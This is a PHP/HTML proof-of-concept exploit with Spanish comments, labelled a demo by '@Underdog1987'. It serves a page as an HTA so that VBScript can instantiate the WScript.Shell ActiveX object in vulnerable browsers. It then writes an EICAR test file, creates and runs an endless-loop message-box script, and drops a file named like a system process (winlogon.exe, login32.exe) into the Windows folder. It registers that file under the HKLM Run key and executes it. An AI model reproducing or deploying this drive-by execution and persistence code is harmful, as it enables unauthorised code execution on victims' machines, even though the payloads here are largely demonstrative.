<?php

	// Impedir el uso del cache del navegador
	header("Expires: Mon, 20 Mar 1998 12:01:00 GMT");
	header("Last-Modified: ".gmdate("D, d M Y H:i:s")." GMT");
	header("Cache-Control: no-store, no-cache, must-revalidate");
	header("Cache-Control: post-check=0, pre-check=0",FALSE);
	header("Pragma: no-cache");
	
	// Encabezado para "hacer creer" al navegador que es un HTA
	header("Content-type: application/hta");
	
?>
<html>
<!-- Esta es la parte que explota el fallo, se logra introcudir un ActiveX potencialmente peligroso
en este caso el el WScript.Shell -->
<object id='wsh' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>
<script language="vbs">
	on error resume next
	rem creamos un EICAR. Al ejecutar el exploit en un navegador vulnerable el AV debe detectarlo (al EICAR)
	wsh.run("cmd.exe /c echo X5O!P%@AP[4\PZX54(P^^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*>%USERPROFILE%\objectData2.exe")
	set fso=createObject("Scripting.fileSystemObject")
	rem Tambien se intenta crear y ejecutar un VBS simple con un loop infinito
	set miArchivo = fso.CreateTextFile("virus.vbs", 2, false)
	miArchivo.writeline("do" )
	miArchivo.writeline("msgbox(" & chr(34) & "Object Data Demo By @Underdog1987 -para cerrar esto, finalizar el proceso wscript.exe - " & chr(34) & ")" )
	miArchivo.writeline("loop" )
	miArchivo.Close
	if fso.getfile("virus.vbs") = "" then
		wscript.popup("Permiso denegado, cierre la sesion e iniciela de nuevo como administrador")
	else
		rem "Rutina de virus", guardarse con un nombre aleatorio y añadirse al run del registro
		randomize timer
		numer = int(rnd * 3)
		select case numer
		case 1
			nume="login32.exe"
		case 2
			nume="winlogon.exe"
		case 3
			nume="msagent.exe"
		case else
			nume="updater32.exe"
		end select
		set winDir=fso.GetSpecialFolder(0)
		set sysDir=fso.GetSpecialFolder(1)
		set vx = fso.CreateTextfile(windir & "\" & nume,2,false)
		vx.writeline("MZ")
		vx.Close
		wsh.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Winlogon", winDir & "\" & nume
		wsh.run("" & windir & "\" & nume)
		wsh.run("wscript virus.vbs")
	end if
</script>
<script language="javascript">
	close(); 
</script>
</html> 
